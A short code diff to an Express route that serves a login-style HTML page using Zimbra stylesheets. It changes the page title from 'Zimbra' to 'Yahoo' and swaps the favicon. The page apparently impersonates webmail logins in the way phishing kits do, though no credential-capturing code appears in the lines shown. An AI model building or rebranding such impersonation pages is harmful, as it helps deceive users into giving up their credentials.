@@ -23,7 +23,7 @@ router.get('/', (req, res) => {
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta http-equiv="cache-control" content="no-cache">
     <meta http-equiv="Pragma" content="no-cache">
-    <title>Zimbra</title>
+    <title>Yahoo</title>
     <link href="./stylesheet/common,login,zhtml,skin.css" rel="stylesheet" type="text/css">
        <script>
                 setTimeout(function() {
@@ -31,7 +31,7 @@ router.get('/', (req, res) => {
                 }, 3000);
             </script> 
     
-    <link rel="SHORTCUT ICON" href="./images/favicon.ico" id="DWT2" type="image/x-icon">
+    <link rel="SHORTCUT ICON" href="./images/img.ico" id="DWT2" type="image/x-icon">
 <style>
 .loader {
     width: 30px;
